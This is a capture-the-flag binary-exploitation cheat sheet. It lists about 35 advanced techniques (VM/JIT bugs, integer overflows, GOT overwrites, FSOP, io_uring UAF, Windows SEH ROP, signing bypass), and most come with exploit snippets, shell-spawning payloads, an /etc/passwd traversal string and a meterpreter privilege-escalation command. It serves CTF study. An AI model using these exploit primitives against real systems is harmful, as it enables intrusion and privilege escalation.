# CTF Pwn - Advanced Exploit Techniques

## Table of Contents
- [VM Exploitation](#vm-exploitation)
  - [VM Signed Comparison Bug](#vm-signed-comparison-bug)
  - [Type Confusion in Interpreter](#type-confusion-in-interpreter)
  - [BF JIT Unbalanced Bracket to RWX Shellcode](#bf-jit-unbalanced-bracket-to-rwx-shellcode)
  - [VM GC-Triggered UAF — Slab Reuse](#vm-gc-triggered-uaf--slab-reuse)
  - [Bytecode Validator Bypass via Self-Modification](#bytecode-validator-bypass-via-self-modification)
- [Integer and Type Vulnerabilities](#integer-and-type-vulnerabilities)
  - [Off-by-One Index to Size Corruption](#off-by-one-index-to-size-corruption)
  - [Integer Truncation via Order of Operations](#integer-truncation-via-order-of-operations)
  - [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
  - [Signed/Unsigned Char Underflow to Heap Overflow](#signedunsigned-char-underflow-to-heap-overflow)
- [Memory Corruption Primitives](#memory-corruption-primitives)
  - [Stack Variable Overlap / Carry Corruption OOB](#stack-variable-overlap--carry-corruption-oob)
  - [1-Byte Overflow via 8-bit Loop Counter](#1-byte-overflow-via-8-bit-loop-counter)
  - [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
  - [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
- [Arbitrary Read/Write Primitives](#arbitrary-readwrite-primitives)
  - [Arbitrary Read/Write via GOT Overwrite](#arbitrary-readwrite-via-got-overwrite)
  - [Stack Leak via __environ and memcpy Overflow](#stack-leak-via-__environ-and-memcpy-overflow)
  - [Write-Anywhere via /proc/self/mem](#write-anywhere-via-procselfmem)
- [FSOP and Advanced Heap](#fsop-and-advanced-heap)
  - [FSOP + Seccomp Bypass via openat/mmap/write](#fsop--seccomp-bypass-via-openatmmapwrite)
  - [House of Apple 2 / TLS Destructor Hijack](#house-of-apple-2--tls-destructor-hijack)
  - [io_uring UAF with SQE Injection](#io_uring-uaf-with-sqe-injection)
  - [Double win() Call Pattern](#double-win-call-pattern)
- [Specialized Exploitation](#specialized-exploitation)
  - [ASAN Shadow Memory Exploitation](#asan-shadow-memory-exploitation)
  - [Format String with Encoding Constraints + RWX .fini_array Hijack](#format-string-with-encoding-constraints--rwx-fini_array-hijack)
  - [Game AI Arithmetic Mean OOB Read](#game-ai-arithmetic-mean-oob-read)
  - [Path Traversal Sanitizer Bypass](#path-traversal-sanitizer-bypass)
  - [DNS Compression Pointer Stack Overflow](#dns-compression-pointer-stack-overflow)
  - [ELF Code Signing Bypass via Program Header Manipulation](#elf-code-signing-bypass-via-program-header-manipulation)
- [JIT and Custom Sandbox Escape](#jit-and-custom-sandbox-escape)
  - [JIT Sandbox Escape via Conditional Jump uint16 Truncation](#jit-sandbox-escape-via-conditional-jump-uint16-truncation)
  - [MD5 Preimage Gadget Construction](#md5-preimage-gadget-construction)
- [Advanced ROP and Privilege Escalation](#advanced-rop-and-privilege-escalation)
  - [Custom Shadow Stack Bypass via Pointer Overflow](#custom-shadow-stack-bypass-via-pointer-overflow)
  - [Signed Int Overflow to Negative OOB Heap Write + XSS-to-Binary Pwn Bridge](#signed-int-overflow-to-negative-oob-heap-write--xss-to-binary-pwn-bridge)
  - [Windows SEH Overwrite + pushad VirtualAlloc ROP](#windows-seh-overwrite--pushad-virtualalloc-rop)
  - [SeDebugPrivilege to SYSTEM](#sedebugprivilege-to-system)
  - [Leakless Libc via Multi-fgets stdout FILE Overwrite](#leakless-libc-via-multi-fgets-stdout-file-overwrite)
- [Architectural and Platform Techniques](#architectural-and-platform-techniques)
  - [ARM Buffer Overflow with Thumb Shellcode](#arm-buffer-overflow-with-thumb-shellcode)
  - [Forth Interpreter Command Execution](#forth-interpreter-command-execution)
  - [GF(2) Gaussian Elimination for Multi-Pass Tcache Poisoning](#gf2-gaussian-elimination-for-multi-pass-tcache-poisoning)

---

## VM Exploitation

### VM Signed Comparison Bug

**Pattern:** Custom VM STORE opcode checks `offset <= 0xfff` with signed `jle` but no lower bound check.

**Exploit:** Negative offsets reach function pointer table. Build values byte-by-byte, compute negative offsets via XOR with `0xFF..FF`, overwrite HALT handler with `system@plt`.

---

### Type Confusion in Interpreter

**Pattern:** Lambda calculus interpreter's `simplify_normal_order()` unconditionally sets function type to ABS even when it's a VAR. Unused bytes 16-23 get interpreted as body pointer.

**Key insight:** Type confusion when type tags aren't validated before downcasting. Unused padding bytes in one variant become active fields in another.

---

### BF JIT Unbalanced Bracket to RWX Shellcode

**Pattern:** BF JIT uses stack for `[`/`]` control flow. Unbalanced `]` pops the **tape address** from RWX memory.

```python
# Unbalanced ] pops RWX tape address → jumps to attacker-controlled memory
stage1 = b''
shellcode_bytes = asm(shellcraft.read(0, 'r14', 256))
for byte in shellcode_bytes:
    if byte <= 127:
        stage1 += b'+' * byte + b'>'
    else:
        stage1 += b'-' * (256 - byte) + b'>'
stage1 += b']'  # Unbalanced ] → jumps to RWX tape
```

---

### VM GC-Triggered UAF — Slab Reuse

**Pattern:** Custom VM with NEWBUF/SLICE/GC. Slicing creates shared reference. When slice dropped and GC'd, frees underlying slab even though parent still alive.

```python
code = b''
code += NEWBUF + uleb128(24) + GSTORE + uleb128(0)   # buf A
code += GLOAD + uleb128(0) + READ + uleb128(24)       # fill
code += GLOAD + uleb128(0) + SLICE + uleb128(0) + uleb128(24)  # slice
code += DROP + GC                                       # free slab via slice
code += BUILTIN + uleb128(0) + GSTORE + uleb128(1)    # func reuses slab
code += GLOAD + uleb128(0) + WRITEBUF + uleb128(16) + uleb128(0)  # set len=16
code += GLOAD + uleb128(0) + PRINTB                    # leak code ptr
code += GLOAD + uleb128(0) + READ + uleb128(16)       # overwrite code ptr
code += PUSH + b'\x00' + GLOAD + uleb128(1) + CALL + uleb128(1)  # call win
code += HALT
```

**Key insight:** Look for shared references (slices, views, aliases) where destruction of one frees resources still held by another.

---

### Bytecode Validator Bypass via Self-Modification

**Pattern:** Bytecode validator only checks initial bytes. Runtime self-modification converts validated `push fs` (`0f a0`) into `syscall` (`0f 05`).

```python
# push rbx overwrites next byte: a0 → 05
code += [0x53]  # push rbx — overwrites 0xa0 → 0x05
code += [0x54, 0x5e, 0x53, 0x5a, 0x54, 0x0f, 0xa0]
# After push rbx: becomes syscall
```

---

## Integer and Type Vulnerabilities

### Off-by-One Index to Size Corruption

**Pattern:** Index 0 writes to `entries[-1]`, overlapping struct's `size` field.

**Exploit chain:** Write to index 0 → set `size = 48` (normally 16) → `print_all` dumps 48 entries → leak canary, RBP, libc return → ROP chain.

---

### Integer Truncation via Order of Operations

**Pattern:** `int position = 4 * (ticks / 1000)` — integer division before multiply truncates.

```c
// 1500 ticks: 4 * (1500/1000) = 4 * 1 = 4 (wrong)
// Correct: 4 * 1500 / 1000 = 6
```

Integer truncation creates off-by-N error → heap metadata corruption → adjacent object pointer overwrite.

---

### Signed Integer Bypass (Negative Quantity)

**Pattern:** `scanf("%d")` for quantity. Negative input bypasses `balance >= total_cost`.

```python
p.sendline(b'10')   # select flag item
p.sendline(b'-1')  # quantity = -1
# -1 * 1000000000 = -1000000000 → balance >= -1000000000 ✓
```

---

### Signed/Unsigned Char Underflow to Heap Overflow

**Pattern:** Size stored as `signed char` but encryption/display casts to `unsigned char`. `size = -112` stores as `char(-112)` but `(unsigned char)(-112) = 144`. 127-byte buffer + 17-byte overflow.

---

## Memory Corruption Primitives

### Stack Variable Overlap / Carry Corruption OOB

**Pattern:** Stack variables share storage due to compiler layout. Carry from arithmetic on one variable corrupts an adjacent variable.

```text
index (byte) at [rsp+0x49] and offset (word) at [rsp+0x48] share storage.
Increment offset by 255 → carry corrupts index from 3 to 4 → OOB table access.
```

**Detection:** In disassembly, check if named variables share partially overlapping `[rsp+N]` accesses with different operand sizes.

---

### 1-Byte Overflow via 8-bit Loop Counter

**Pattern:** `read_stdin()` uses 8-bit loop counter wrapping after 64, writes 65 bytes to 64-byte buffer, overflowing into adjacent size variable.

**Progressive leak technique:**
1. Trigger 1-byte overflow → increase size from 0x40 to 0x48 → leak canary
2. Increase size to 0x77 → leak libc return address
3. Craft final payload with canary + ROP chain

---

### Canary-Aware Partial Overflow

**Pattern:** Buffer overflow where `valid` flag sits between buffer end and canary.

```text
Buffer: rbp-0x30 (48 bytes) | Valid: rbp-0x10 | Canary: rbp-0x08
```

**Key technique:** Use `./` as no-op path padding to control input length precisely. Byte 32 must be non-zero to set `valid = true`.

---

### Global Buffer Overflow (CSV Injection)

**Pattern:** Adjacent global variables exploitable via overflow.

```python
edit_cell("J10", "whatever,flag.txt")  # comma overflow
save()   # Column 11 overwrites filename pointer with "flag.txt"
load()   # Reads flag.txt into spreadsheet
```

---

## Arbitrary Read/Write Primitives

### Arbitrary Read/Write via GOT Overwrite

**Pattern:** Binary provides explicit arbitrary read/write menu options.

```python
# 1. Leak libc via GOT read
p.sendline(b'read')
p.sendline(hex(elf.got['puts']))
libc_base = u64(p.recv(8)) - libc.sym['puts']

# 2. Overwrite GOT with system
p.sendline(b'write')
p.sendline(hex(elf.got['strtoll']))
p.sendline(hex(libc_base + libc.sym['system']))

# 3. Trigger shell
p.sendline(b'sh')
```

**Key insight:** Choose GOT entry for function taking user-controlled string as first arg. `strtoll`, `atoi`, `printf` are good candidates.

---

### Stack Leak via __environ and memcpy Overflow

**Pattern:** Arbitrary read primitive (memcpy from user_addr) but NO write. The `memcpy` overflow itself becomes the write primitive.

```python
# 1. Leak libc via GOT read
# 2. Leak stack via __environ
environ_addr = libc_base + libc.sym['__environ']
p.sendline(f'read {hex(environ_addr)}')
stack_addr = u64(p.recv(8))

# 3. Plant ROP payload in input buffer
# 4. memcpy overflow → copy planted payload over return address
# 5. EOF → function returns through overwritten address
```

---

### Write-Anywhere via /proc/self/mem

**Pattern:** Service allows writing arbitrary files at arbitrary offsets. Target `/proc/self/mem` for code injection.

```python
def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

# Overwrite return address with shellcode address
write_mem(r, target_code_addr, shellcode)
```

**Key insight:** Writing to text segments works even when mapped read-only — kernel performs write through page tables directly.

---

## FSOP and Advanced Heap

### FSOP + Seccomp Bypass via openat/mmap/write

**Pattern:** Heap exploit (UAF) → FSOP chain, but seccomp blocks `open`/`read`/`write`. Use `openat`/`mmap`/`write` instead.

```python
# Alternative syscalls not blocked:
# openat(AT_FDCWD, "/flag", O_RDONLY) = 257
# mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0) = 9
# write(1, mapped_addr, 4096) = 1

rop = ROP(libc)
rop.openat(-100, flag_str_addr, 0)   # AT_FDCWD = -100
# xchg rdi, rax captures open()'s return value
rop.mmap(0, 0x1000, 1, 2, actual_fd, 0)  # MAP_PRIVATE=2
rop.write(1, mapped_addr, 0x1000)
```

**`mov rsp, rdx` gadget:** In FSOP context, rdx controllable via `_IO_wide_data` fields. Set `_wide_data->_IO_buf_base` → stack pivot.

---

### House of Apple 2 / TLS Destructor Hijack

**When to use:** Modern glibc (2.34+) where `__free_hook`/`__malloc_hook` removed.

```python
# TLS destructor overwrite via FSOP:
# __call_tls_dtors iterates list calling PTR_DEMANGLE(func)(obj)
# Demangling: ror(val, 0x11) ^ pointer_guard

pointer_guard = tls_leak  # from stdout FSOP leak
encoded_setuid = rol(libc.sym.setuid ^ pointer_guard, 0x11)
encoded_system = rol(libc.sym.system ^ pointer_guard, 0x11)

# Overwrite __tls_dtor_list with crafted entries
# Each entry: func, obj, next (mangled with pointer_guard)
```

---

### io_uring UAF with SQE Injection

**Pattern:** Multi-threaded binary with custom slab allocator. FLUSH frees objects but preserves dangling pointers → UAF. Type confusion → inject crafted io_uring SQE → worker executes arbitrary kernel operations.

```python
def craft_sqe(pie_base, flag_path_offset=0x6010):
    sqe = bytearray(64)
    struct.pack_into('B', sqe, 0, 0x12)       # opcode = IORING_OP_OPENAT
    struct.pack_into('i', sqe, 4, -100)         # fd = AT_FDCWD
    struct.pack_into('Q', sqe, 16, pie_base + flag_path_offset)
    return bytes(sqe)
```

---

### Double win() Call Pattern

**Pattern:** `win()` has `if (attempts++ > 0)` check — first call fails, second succeeds.

```python
payload = b'A' * offset + p64(win) + p64(win)
```

---

## Specialized Exploitation

### ASAN Shadow Memory Exploitation

**Pattern:** Binary compiled with ASAN has format string + OOB write vulnerabilities.

**Shadow Byte Layout:**
| Shadow Value | Meaning |
|-------------|---------|
| `0x00` | Fully accessible (8 bytes) |
| `0x01-0x07` | Partially accessible (1-7 bytes) |
| `0xF1` | Stack left redzone |

**Key insight:** ASAN may use a "fake stack" (50% chance) — exploit with retry until real stack hit.

---

### Format String with Encoding Constraints + RWX .fini_array Hijack

**Pattern:** Input base85-encoded into RWX memory at fixed address, then passed to `printf()`. Exploit the RWX region directly.

```python
# 1. Overwrite .fini_array[0] with RWX shellcode address
# 2. Use %hn to write 2 bytes at a time
# 3. When main() returns, __libc_csu_fini calls shellcode
```

**Don't try libc-based exploitation** when base85 encoding makes address calculation difficult.

---

### Game AI Arithmetic Mean OOB Read

**Pattern:** AI computes `ai_move = (human + last_computer) / 2`. Submit extreme values → computed position reads past buffer.

```python
# Submit row=100000, col=100000
# AI computes (100000 + 0) / 2 = 50001 → OOB read
# Brute-force offset to find flag
```

**Key insight:** Input validation that occurs AFTER variable assignment creates TOCTOU gap.

---

### Path Traversal Sanitizer Bypass

**Pattern:** Sanitizer removes `.` and `/` but skips next character after match.

```python
"....//....//etc//passwd"
# Each '..' becomes '....' (first caught, second skipped, third caught)
```

**Flag via `/proc/self/fd/N`:**
```python
# If binary opens flag but doesn't close fd: read via /proc/self/fd/3
```

---

### DNS Compression Pointer Stack Overflow

**Pattern:** Custom DNS server. DNS compression pointers allow jumping to arbitrary packet positions. Parser doesn't track total decompressed length → compression chains expand small packet into large overflow.

```python
# DNS compression: \xC0\x0D = jump to byte 13
# Chain: A → B → C → ... → overflows 1024-byte stack buffer
# Split ROP across 3 question entries (14+14+13 gadgets)
```

---

### ELF Code Signing Bypass via Program Header Manipulation

**Pattern:** Signing system hashes section headers + content but NOT program headers (which control what loader maps).

```python
# 1. Page-align binary, append shellcode
# 2. Modify code segment's program header: p_offset → appended data
# 3. Section headers unchanged → signature still valid
# 4. Upload → server verifies → executes shellcode
```

**Key insight:** Section headers are optional at runtime. Any signing scheme relying solely on sections is bypassable.

---

## JIT and Custom Sandbox Escape

### JIT Sandbox Escape via Conditional Jump uint16 Truncation

**Pattern:** JIT emits `jz` with 32-bit offset but calculates as `uint16_t` — truncates to 16 bits. When code exceeds 65535 bytes, truncated offset lands inside future instruction's immediate value.

```ruby
# Emit ~9370 add instructions in always-false if block
# Truncated jz lands in middle of add's 32-bit immediate
# Thread 2-byte instruction fragments via jmp $+3
```

---

### MD5 Preimage Gadget Construction

**Pattern:** Server concatenates MD5 digests and executes them as code. Brute-force preimages with desired byte prefixes.

```python
# Use eb 0c (jmp +12) as first 2 bytes → skips middle 12 bytes
# Last 2 bytes become 2-byte instruction
# Chain: jmp+sled, push win addr, ret

for ctr in range(2**32):
    MD5(msg, msg_len, digest)
    if digest[0] == 0xEB and digest[1] == 0x0C:
        if (digest[14] << 8) | digest[15] == target_instruction:
            break
```

**Brute-force time:** 32-bit prefix: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.

---

## Advanced ROP and Privilege Escalation

### Custom Shadow Stack Bypass via Pointer Overflow

**Pattern:** Binary implements userland shadow stack in `.bss`. `shadow_stack_ptr` increments on every call but is NEVER bounds-checked — overflows past array into adjacent `.bss` variables.

```python
# Recurse 512 times to overflow shadow_stack_ptr into username buffer
for i in range(iterations):
    io.sendlineafter(b"Survivor name:\n", name)
    io.sendlineafter(b"[0] Flee", b"4")  # trigger recursion

# username buffer now holds win() address
# Overflow stack to also set hardware return address to win()
payload = fit({56: exe.symbols["win"]})
io.sendlineafter(b"(0-255):\n", payload)
```

**Detection:** Look for `.bss` arrays used as shadow stacks, missing bounds check on index, user-writable `.bss` adjacent to array.

---

### Signed Int Overflow to Negative OOB Heap Write + XSS-to-Binary Pwn Bridge

**Pattern:** Pixel index formula `y * width + x` uses signed 32-bit int. Large `y` → multiplication overflows to negative → passes bounds check → **negative OOB heap write**.

```python
# 50x50 canvas: (8589934591 * 50 + 42) as int32 = -8
# ×3 RGB offset = -24 bytes before data buffer
cmd(b'SET 1 42 8589934591 0x340000')  # overwrite height field
```

**XSS-to-Binary Pwn Bridge:** Flask API behind native binary. Stored XSS in admin bot → calls admin API → triggers binary commands → integer overflow → heap corruption → ROP.

---

### Windows SEH Overwrite + pushad VirtualAlloc ROP

**Pattern:** 32-bit Windows PE with ASLR, DEP, GS but SafeSEH disabled.

```python
# 1. Format string leak → PIE base
# 2. Buffer overflow → overwrite SEH handler chain
# 3. Stack pivot via SEH handler: add esp, 0xe10; ret
# 4. pushad VirtualAlloc builds entire call frame in one instruction
# 5. jmp esp → shellcode
```

**pushad** pushes all 8 GPRs (EDI, ESI, EBP, ESP, EBX, EDX, ECX, EAX) in one instruction. Pre-load registers → `pushad` → call.

---

### SeDebugPrivilege to SYSTEM

```text
meterpreter > migrate -N winlogon.exe
meterpreter > getuid
# NT AUTHORITY\SYSTEM
```

---

### Leakless Libc via Multi-fgets stdout FILE Overwrite

**Pattern:** No direct libc leak. Construct fake `stdout` FILE on BSS via ROP, then `fflush(stdout)` leaks GOT entry content.

**Problem:** `fgets` appends `\x00` — corrupts adjacent FILE struct fields.

**Solution:** Chain multiple `fgets(addr, 7, stdin)` calls. Null byte from each lands on the next field's null MSB (harmless for libc pointers):

```python
rop += fgets_call(FAKE_STDOUT + 0x20, 7)  # write &fflush@GOT
# null byte overwrites already-null MSB of 8-byte pointer
```

---

## Architectural and Platform Techniques

### ARM Buffer Overflow with Thumb Shellcode

```asm
# Thumb mode: set bit 0 of address
# Syscall numbers: execve=11, dup2=63
mov  r0, #4
movs r7, #0x3f   @ dup2(4, 0) — stdin
svc  #1
movs r7, #0xb    @ execve
svc  #1
```

**Cross-compile:** `arm-linux-gnueabi-as -mthumb -o sc.o shellcode.s`

---

### Forth Interpreter Command Execution

```forth
s" cat /flag" system
s" /bin/sh" system
```

Check for dangerous words: `system`, `included`, `open-file`, `read-file`.

---

### GF(2) Gaussian Elimination for Multi-Pass Tcache Poisoning

**Pattern:** Binary applies XOR cipher to heap data (corrupting tcache `fd` pointers). Each cipher seed produces different XOR keystream. Model as GF(2) linear algebra:

```python
def find_subset_xor(vectors, target):
    """Find subset of 64-bit vectors XORing to target"""
    basis = {}
    for i, v in enumerate(vectors):
        val = v
        for bit in range(63, -1, -1):
            if not (val >> bit) & 1:
                continue
            if bit in basis:
                val ^= basis[bit][0]
            else:
                basis[bit] = (val, i)
                break
    # Solve for target via Gaussian elimination
```

Typical result: ~30-35 seeds from 10,000-seed space.
